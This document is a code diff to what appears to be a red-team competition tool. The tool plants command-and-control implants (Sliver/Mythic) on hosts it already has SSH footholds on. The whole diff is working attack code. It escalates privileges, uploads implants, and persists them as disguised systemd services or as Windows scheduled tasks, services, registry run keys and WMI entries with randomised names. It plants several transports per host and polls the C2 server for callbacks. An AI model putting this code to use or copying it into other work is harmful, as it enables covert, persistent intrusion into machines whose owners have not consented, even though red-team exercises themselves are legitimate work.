@@ -34,18 +34,37 @@ def load_manifest(comp_dir):
         raise C2Error(f"{path} is not valid JSON: {exc}") from exc
 
 
-def manifest_entry(manifest, box_id, transport=None):
-    """comp-prep keys the manifest by `<box>:<transport>`."""
+def entry_name(entry, box_id):
+    return entry.get("name") or f"{box_id}-{entry.get('transport') or 'mtls'}"
+
+
+def manifest_entries(manifest, box_id, transport=None):
+    """All comp-prep payloads for one box, optionally one transport.
+
+    Sliver keys the manifest by build name (`<box>-<transport>`); the Mythic
+    matrix keys it `<box>:<transport>`. Accept both.
+    """
     boxes = (manifest or {}).get("boxes") or {}
-    if box_id in boxes:
-        return boxes[box_id]
-    wanted = f"{box_id}:{transport}" if transport else None
-    if wanted and wanted in boxes:
-        return boxes[wanted]
+    out = []
     for key, entry in boxes.items():
-        if key.split(":", 1)[0] == box_id:
-            return entry
-    return None
+        if not isinstance(entry, dict):
+            continue
+        key_box = entry.get("box") or key.split(":", 1)[0]
+        key_transport = (key.split(":", 1)[1] if ":" in key
+                         else entry.get("transport"))
+        if key_box != box_id and key.split(":", 1)[0] != box_id:
+            continue
+        if transport and key_transport != transport:
+            continue
+        out.append(entry)
+    return out
+
+
+def manifest_entry(manifest, box_id, transport=None):
+    entries = manifest_entries(manifest, box_id, transport)
+    if not entries and transport:
+        entries = manifest_entries(manifest, box_id)
+    return entries[0] if entries else None
 
 
 def payload_file(comp_dir, entry):
@@ -69,35 +88,75 @@ class Planter:
         self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
         self._now = now or time.time
 
-    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
-        """The callback window is 120s because a freshly installed Mythic takes minutes to check in."""
+    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None,
+              only_missing=False):
+        """Plant every selected transport; a channel counts only when its callback appears."""
         if wait_sec is None:
             wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
         os_name = os_name or self.ctx.os_of(ip)
-        entry = manifest_entry(self.manifest, box_id, transport)
-        if entry is None:
+        entries = [entry for entry in manifest_entries(self.manifest, box_id, transport)
+                   if entry.get("plant", True)]
+        if only_missing and entries:
+            records = (self.ctx.c2.callbacks_by_name()
+                       if hasattr(self.ctx.c2, "callbacks_by_name")
+                       else self.ctx.c2.callbacks())
+            missing = [entry for entry in entries
+                       if not self._fresh(records.get(entry_name(entry, box_id)))]
+            if not missing:
+                return {"ok": True, "callback_seen": True, "box": box_id,
+                        "detail": "every C2 transport already checked in",
+                        "coverage": {entry_name(e, box_id): True for e in entries}}
+            entries = missing
+        if not entries:
             return {"ok": False, "callback_seen": False, "box": box_id,
-                    "detail": f"no manifest entry for {box_id} "
+                    "detail": f"no plantable manifest entry for {box_id} "
                               "(run comp-prep / `tlaloc c2-prep` first)"}
-        local = payload_file(self.comp_dir, entry)
-        if local is None:
-            return {"ok": False, "callback_seen": False, "box": box_id,
-                    "detail": f"payload file for {box_id} is missing from "
-                              f"{self.comp_dir}/red/payloads"}
-        transport = transport or entry.get("transport") or "http"
-        if os_name == "windows":
-            installed = self._install_windows(ip, box_id, local, transport,
-                                              wait_sec=wait_sec)
-        else:
-            installed = self._install_linux(ip, box_id, local, transport)
+        full = str(((self.ctx.cfg.get("c2") or {}).get("implant_spread", "draw"))
+                   ).strip().lower() == "full"
+        if not full and not transport:
+            entries = entries[:1]
+        installed, failures, paths, undos, mechanisms = [], [], [], [], []
+        for entry in entries:
+            local = payload_file(self.comp_dir, entry)
+            entry_transport = entry.get("transport") or "mtls"
+            if local is None:
+                failures.append(f"{entry.get('name') or entry_transport}: payload "
+                                f"missing from {self.comp_dir}/red/payloads")
+                continue
+            if os_name == "windows":
+                outcome = self._install_windows(ip, box_id, local, entry_transport,
+                                                wait_sec=wait_sec,
+                                                suffix=entry_transport)
+            else:
+                outcome = self._install_linux(ip, box_id, local, entry_transport,
+                                              suffix=entry_transport)
+            outcome["name"] = entry.get("name")
+            outcome["transport"] = entry_transport
+            installed.append(outcome)
+            if not outcome.get("ok"):
+                failures.append(f"{entry_transport}: {outcome.get('detail')}")
+            paths.extend(outcome.get("paths") or [])
+            undos.extend(outcome.get("undo") or [])
+            mechanisms.extend(outcome.get("mechanisms") or [])
 
-        callback_seen = self.wait_for_callback(box_id, wait_sec=wait_sec) \
-            if installed.get("ok") else False
-        return {**installed, "box": box_id, "os": os_name, "transport": transport,
-                "callback_seen": callback_seen, "uuid": entry.get("uuid"),
-                "payload": str(local)}
+        names = [outcome["name"] or box_id for outcome in installed]
+        seen = self.wait_for_callbacks(names, wait_sec=wait_sec) if names else {}
+        callback_seen = (all(seen.values()) if full else any(seen.values())) \
+            if seen else False
+        ok = bool(installed) and not failures
+        detail = "; ".join(
+            f"{outcome['transport']}: {outcome.get('detail')}" for outcome in installed)
+        if failures:
+            detail = "; ".join(failures)
+        return {"ok": ok, "callback_seen": callback_seen, "box": box_id,
+                "os": os_name, "transport": installed[0]["transport"] if installed else None,
+                "detail": detail, "unit": installed[0].get("unit") if installed else None,
+                "paths": paths, "undo": undos, "mechanisms": mechanisms,
+                "coverage": {name: bool(seen.get(name)) for name in names},
+                "uuid": installed[0].get("uuid") if installed else None,
+                "payload": str(payload_file(self.comp_dir, entries[0]) or "")}
 
-    def _install_linux(self, ip, box_id, local, transport):
+    def _install_linux(self, ip, box_id, local, transport, *, suffix=""):
         from ..effects import artifactnames as names
         from ..effects.base import root_cmd
         fh = self.ctx.world.foothold(ip)
@@ -105,10 +164,34 @@ class Planter:
             return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
         names_drawn = names.linux_names(self.ctx.world, rng=self.ctx.rng,
                                        mode=names.mode_from_cfg(self.ctx.cfg))
+        if suffix:
+            names_drawn = dict(names_drawn)
+            names_drawn["stem"] = f"{names_drawn['stem']}-{suffix}"
+            unit = names_drawn["unit"]
+            names_drawn["unit"] = (unit[:-len(".service")] + f"-{suffix}.service"
+                                   if unit.endswith(".service") else f"{unit}-{suffix}")
         unit = names_drawn["unit"]
         stage = f"/tmp/{names_drawn['stem']}"
-        remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}"
+        tag = f"-{suffix}" if suffix else ""
+        remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}{tag}"
         unit_path = f"/etc/systemd/system/{unit}"
+        if suffix:
+            # A re-plant used to add a second unit for the same transport and
+            # leave the old one running: two WG clients fought over wg0 and the
+            # survivor still looked "activating" (live: web01-150, 2026-10-22).
+            rc, out, _err = self.ctx.ssh.ssh(
+                ip, fh["user"], fh.get("password") or "",
+                "systemctl list-units --all --no-legend --type=service | "
+                f"awk '{{print $1}}' | grep -- '-{suffix}.service$' || true",
+                timeout=60, key_path=fh.get("key_path"))
+            old = [u for u in (out or "").split() if u.endswith(f"-{suffix}.service")]
+            if old:
+                root_cmd_cleanup = (f"systemctl disable --now {' '.join(old)}; "
+                                    f"rm -f {' '.join('/etc/systemd/system/' + u for u in old)}; "
+                                    "systemctl daemon-reload")
+                self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
+                                 root_cmd(root_cmd_cleanup, fh), timeout=120,
+                                 key_path=fh.get("key_path"))
         # Every privileged step rides the escalation the seed proved (or a root
         # foothold); a sudo refusal means the label was wrong, never a retry without it.
         label = fh.get("escalation") or fh.get("kind") or "?"
@@ -128,7 +211,7 @@ class Planter:
             "[Install]\nWantedBy=multi-user.target\n")
         try:
             self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
-                                  f"{stage}/{box_id}", mode=0o755,
+                                  f"{stage}/{box_id}{tag}", mode=0o755,
                                   key_path=fh.get("key_path"))
             # The unit rides sftp like the payload: a heredoc cannot repeat a
             # non-sudo command through an escape label.
@@ -143,7 +226,7 @@ class Planter:
                     "paths": [remote]}
         privileged = (
             ("create install dir", f"mkdir -p /usr/local/lib/{names_drawn['stem']}"),
-            ("move payload", f"mv {stage}/{box_id} {remote}"),
+            ("move payload", f"mv {stage}/{box_id}{tag} {remote}"),
             ("chmod payload", f"chmod 755 {remote}"),
             ("move unit", f"mv {stage}/{unit} {unit_path}"),
             ("daemon-reload", "systemctl daemon-reload"),
@@ -231,7 +314,7 @@ class Planter:
                     os.unlink(local)
         return chosen, paths, undo, "; ".join(notes)
 
-    def _install_windows(self, ip, box_id, local, transport, wait_sec=120):
+    def _install_windows(self, ip, box_id, local, transport, wait_sec=120, *, suffix=""):
         from ..effects import artifactnames as names
         fh = self.ctx.world.foothold(ip)
         if not fh:
@@ -239,6 +322,11 @@ class Planter:
         rng = self.ctx.rng
         drawn = names.windows_names(self.ctx.world, rng=rng,
                                     mode=names.mode_from_cfg(self.ctx.cfg))
+        if suffix:
+            drawn = dict(drawn)
+            for key in ("stem", "task", "service", "run_value", "wmi"):
+                if drawn.get(key):
+                    drawn[key] = f"{drawn[key]}-{suffix}"
         full_spread = (str(((self.ctx.cfg or {}).get("c2") or {})
                            .get("implant_spread", "draw")).strip().lower() == "full")
         if full_spread:
@@ -252,13 +340,13 @@ class Planter:
             rng.shuffle(redundant)
             redundant = redundant[:rng.choice((1, 2))]
         remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
-        remote = f"{remote_dir}\\{box_id}.exe"
-        staged = f"C:/ProgramData/{drawn['stem']}/{box_id}.exe"
+        tag = f"-{suffix}" if suffix else ""
+        remote = f"{remote_dir}\\{box_id}{tag}.exe"
+        staged = f"C:/ProgramData/{drawn['stem']}/{box_id}{tag}.exe"
         try:
             self._win(ip, fh, f'powershell -NoProfile -Command "New-Item -ItemType '
                               f'Directory -Force -Path \'{remote_dir}\' | Out-Null"')
-            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
-                                  staged, key_path=fh.get("key_path"))
+            self._put(ip, fh, local, staged)
         except Exception as exc:
             return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                     "paths": [remote]}
@@ -299,6 +387,19 @@ class Planter:
                 "undo": undo or [f'schtasks /Delete /TN "{drawn["task"]}" /F',
                                  f"Remove-Item -Path '{remote}' -Force"],
                 "check_cmd": f'tasklist /FI "IMAGENAME eq {Path(staged).name}"'}
+
+    def _put(self, ip, fh, local, remote, mode=None, attempts=2):
+        """A 40-50MB implant over Windows OpenSSH occasionally drops one SFTP put."""
+        for attempt in range(attempts):
+            try:
+                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
+                                      str(local), remote, mode=mode,
+                                      key_path=fh.get("key_path"))
+                return
+            except Exception:
+                if attempt + 1 >= attempts:
+                    raise
+                time.sleep(3)
 
     def _win_ps(self, ip, fh, body, timeout=120):
         """-EncodedCommand is one token: cmd /c quoting silently lost embedded reg/WMI values."""
@@ -451,34 +552,67 @@ class Planter:
                 "paths": [f"registry:{key}"],
                 "undo": [f'reg delete "{key}" /f']}
 
+    def channels_up(self, box_id, transport=None):
+        """True when every plantable payload for this box already has a fresh callback."""
+        entries = [entry for entry in manifest_entries(self.manifest, box_id, transport)
+                   if entry.get("plant", True)]
+        if not entries or self.ctx.c2 is None:
+            return False
+        records = (self.ctx.c2.callbacks_by_name()
+                   if hasattr(self.ctx.c2, "callbacks_by_name")
+                   else self.ctx.c2.callbacks())
+        for entry in entries:
+            if not self._fresh(records.get(entry_name(entry, box_id))):
+                return False
+        return True
+
     def wait_for_callback(self, box_id, *, wait_sec=45, poll_interval=5):
         """tavern/mythic keep callback rows after the agent dies; only a fresh row counts."""
-        if self.ctx.c2 is None:
-            return False
+        return self.wait_for_callbacks([box_id], wait_sec=wait_sec,
+                                       poll_interval=poll_interval).get(box_id, False)
+
+    def wait_for_callbacks(self, names, *, wait_sec=45, poll_interval=5):
+        """Poll every planted name at once: a channel is proven by its own fresh row."""
+        pending = list(dict.fromkeys(names))
+        seen = {name: False for name in pending}
+        if self.ctx.c2 is None or not pending:
+            return seen
         deadline = self._now() + max(wait_sec, 0)
         while True:
             try:
-                record = self.ctx.c2.callbacks().get(box_id)
+                records = self.ctx.c2.callbacks_by_name() \
+                    if hasattr(self.ctx.c2, "callbacks_by_name") \
+                    else self.ctx.c2.callbacks()
             except C2Error:
-                return False
-            if record and self._fresh(record):
-                if self.ctx.world is not None and record.get("seen_at"):
-                    self.ctx.world.note_callback(box_id, self._iso(record["seen_at"]),
-                                                 agent=record.get("agent"),
-                                                 external_id=record.get("external_id"))
-                return True
-            if self._now() >= deadline:
-                return False
+                return seen
+            for name in pending:
+                if seen[name]:
+                    continue
+                record = records.get(name)
+                if not record:
+                    record = self.ctx.c2.callback_for(name) \
+                        if hasattr(self.ctx.c2, "callback_for") else None
+                if record and self._fresh(record):
+                    seen[name] = True
+                    if self.ctx.world is not None and record.get("seen_at"):
+                        self.ctx.world.note_callback(
+                            record.get("box_id") or name,
+                            self._iso(record["seen_at"]), agent=record.get("agent"),
+                            external_id=record.get("external_id"))
+            if all(seen.values()) or self._now() >= deadline:
+                return seen
             time.sleep(poll_interval)
 
     def _fresh(self, record):
-        seen = record.get("seen_at")
-        if not seen:
+        if not record:
             return False
         if str(record.get("agent") or "").lower() == "none":
             return False
         max_age = float(self.ctx.cfg["c2"].get("callback_max_age_sec", 120))
-        return (self._now() - float(seen)) <= max_age
+        if hasattr(self.ctx.c2, "record_fresh"):
+            return bool(self.ctx.c2.record_fresh(record, max_age))
+        seen = record.get("seen_at")
+        return bool(seen) and (self._now() - float(seen)) <= max_age
 
     def _iso(self, epoch):
         return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))
